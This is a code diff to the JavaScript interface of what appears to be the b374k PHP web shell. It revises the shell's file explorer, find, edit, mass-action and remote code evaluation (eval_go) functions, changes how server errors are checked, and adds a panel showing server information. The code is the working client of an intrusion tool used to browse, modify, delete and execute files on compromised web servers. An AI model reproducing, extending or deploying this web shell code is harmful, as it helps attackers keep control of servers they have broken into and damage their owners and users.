@@ -12,16 +12,18 @@ function action(path, type){
 function navigate(path, showfiles){
 	if(showfiles==null) showfiles = 'true';
 	send_post({ cd:path, showfiles:showfiles }, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			splits = res.split('{[|b374k|]}');
-			if(splits.length==3){
+			if(splits.length==4){
 				$('#nav').html(splits[1]);
 				if(showfiles=='true'){
 					$('#explorer').html('');
 					$('#explorer').html(splits[2]);
 					sorttable.k($('#xplTable').get(0));
 				}
-				$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
+				// $('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
+				$('#terminalCwd').html(html_safe(splits[0])+'&gt;');
+				$('#basicInfoContent').html(splits[3]);
 				xpl_bind();
 				window_resize();
 			}
@@ -32,7 +34,7 @@ function navigate(path, showfiles){
 function view(path, type, preserveTimestamp){
 	if(preserveTimestamp==null) preserveTimestamp = 'true';
 	send_post({ viewFile: path, viewType: type, preserveTimestamp:preserveTimestamp }, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			$('#explorer').html('');
 			$('#explorer').html(res);
 			xpl_bind();
@@ -71,7 +73,7 @@ function ren_go(){
 	renameFile = $('.renameFile').val();
 	renameFileTo = $('.renameFileTo').val();
 	send_post({renameFile:renameFile, renameFileTo:renameFileTo}, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			navigate(res);
 			$('.boxresult').html('Operation(s) succeeded');
 			$('.renameFile').val($('.renameFileTo').val());
@@ -90,7 +92,7 @@ function newfolder(path){
 function newfolder_go(){
 	newFolder = $('.newFolder').val();
 	send_post({newFolder:newFolder}, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			navigate(res);
 			$('.boxresult').html('Operation(s) succeeded');
 		}
@@ -108,7 +110,7 @@ function newfile(path){
 function newfile_go(){
 	newFile = $('.newFile').val();
 	send_post({newFile:newFile}, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			view(newFile, 'edit');
 			$('.boxresult').html('Operation(s) succeeded');
 		}
@@ -125,7 +127,7 @@ function viewfileorfolder(){
 function viewfileorfolder_go(){
 	entry = $('.viewFileorFolder').val();
 	send_post({viewFileorFolder:entry}, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			if(res=='file'){
 				view(entry, 'auto');
 				show_tab('explorer');
@@ -147,7 +149,7 @@ function del(path){
 function delete_go(){
 	path = $('.delete').val();
 	send_post({delete:path}, function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			navigate(res);
 			$('.boxresult').html('Operation(s) succeeded');
 		}
@@ -156,8 +158,8 @@ function delete_go(){
 }
 
 function find(path){
-	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
-	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
+	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td style=\"display: flex;\"><span class='button' onclick=\"find_go_file();\">find</span><span class='button' onclick=\"find_go_file_clean();\">clean</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
+	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td style=\"display: flex;\"><span class='button' onclick=\"find_go_folder();\">find</span><span class='button' onclick=\"find_go_folder_clean();\">clean</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
 	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
 	cbox_bind('xplUpload');
 }
@@ -166,8 +168,16 @@ function find_go_file(){
 	find_go('file');
 }
 
+function find_go_file_clean(){
+	$('.findfileResult').html('');
+}
+
 function find_go_folder(){
 	find_go('folder');
+}
+
+function find_go_folder_clean(){
+	$('.findResult').html('');
 }
 
 function find_go(findType){
@@ -201,7 +211,7 @@ function find_go(findType){
 			findExecutable:findExecutable
 		},
 		function(res){
-			if(res!='error'){
+			if(res.indexOf('error') != 0){
 				findResult.html(res);
 			}
 		}
@@ -382,7 +392,7 @@ function edit_save(editType){
 	if($('.cBox').hasClass('cBoxSelected')) preserveTimestamp = 'true';
 	send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},
 		function(res){
-		if(res!='error'){
+		if(res.indexOf('error') != 0){
 			editSuccess = 'success';
 			view(editFilename, editType, preserveTimestamp);
 		}
@@ -565,7 +575,7 @@ function mass_act_go(massType){
 
 	if(massBuffer!=''){
 		send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue }, function(res){
-			if(res!='error'){
+			if(res.indexOf('error') != 0){
 				$('.boxresult').html(res+' Operation(s) succeeded');
 			}
 			else $('.boxresult').html('Operation(s) failed');
@@ -766,7 +776,7 @@ function eval_go(){
 	if($.trim(evalInput)!=''){
 		send_post({ evalInput:evalInput, evalType:evalType, evalOptions:evalOptions, evalArguments:evalArguments },
 			function(res){
-				if(res!='error'){
+				if(res.indexOf('error') != 0){
 					splits = res.split('{[|b374k|]}');
 					if(splits.length==2){
 						output = splits[0]+"<hr>"+splits[1];
